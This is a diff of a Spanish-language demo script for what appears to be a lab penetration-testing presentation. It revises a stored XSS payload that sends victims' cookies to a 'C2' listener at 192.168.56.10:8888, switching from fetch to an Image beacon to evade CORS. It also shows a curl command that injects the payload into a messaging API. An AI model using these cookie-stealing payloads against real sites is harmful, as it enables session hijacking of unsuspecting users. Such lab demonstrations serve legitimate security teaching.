@@ -110,11 +110,11 @@
 * 🖥️ **Acción Visual:** Creas el archivo JSON con el script XSS usando un comando de una sola línea.
 * ⌨️ **Comando a escribir:**
   ```bash
-  echo '{"receiverId": 1, "content": "<script>fetch(\"http://192.168.56.10:8888/?c=\"+encodeURIComponent(document.cookie),{mode:\"no-cors\"});</script>"}' > payload_xss.json
+  echo '{"receiverId": 1, "content": "<script>new Image().src = \"http://192.168.56.10:8888/?c=\" + btoa(document.cookie);</script>"}' > payload_xss.json
   cat payload_xss.json
   ```
 * 🗣️ **Lo que dices mientras tipeas y muestras `payload_xss.json`:**
-  > *"Finalmente, para la vulnerabilidad **OWASP A05:2025 Stored XSS (CWE-79 y CWE-116)**, creamos el archivo `payload_xss.json`. Diseñamos una etiqueta `<script>` que, al ser inyectada y renderizada por el `innerHTML` del cliente, enviará asíncronamente la cookie de la víctima hacia nuestro listener C2 en `192.168.56.10:8888`. Con esto completamos el armamento de nuestros cuatro vectores de ataque."*
+  > *"Finalmente, para la vulnerabilidad **OWASP A05:2025 Stored XSS (CWE-79 y CWE-116)**, creamos el archivo `payload_xss.json`. Diseñamos una etiqueta `<script>` que, al ser inyectada y renderizada por el `innerHTML` del cliente, enviará asíncronamente la cookie de la víctima usando un `Image Beacon` hacia nuestro listener C2 en `192.168.56.10:8888`, evadiendo así las políticas CORS. Con esto completamos el armamento de nuestros vectores."*
 
 ---
 
@@ -163,7 +163,7 @@
 * ⌨️ **Comandos a escribir:**
   ```bash
   cat << 'EOF' > payload_xss.json
-  {"receiverId": 1, "content": "<script>fetch(\"http://192.168.56.10:8888/?c=\"+encodeURIComponent(document.cookie),{mode:\"no-cors\"});</script>"}
+  {"receiverId": 1, "content": "<script>new Image().src = \"http://192.168.56.10:8888/?c=\" + btoa(document.cookie);</script>"}
   EOF
   curl -i -X POST http://192.168.56.20:4000/api/message \
        -H "Content-Type: application/json" \
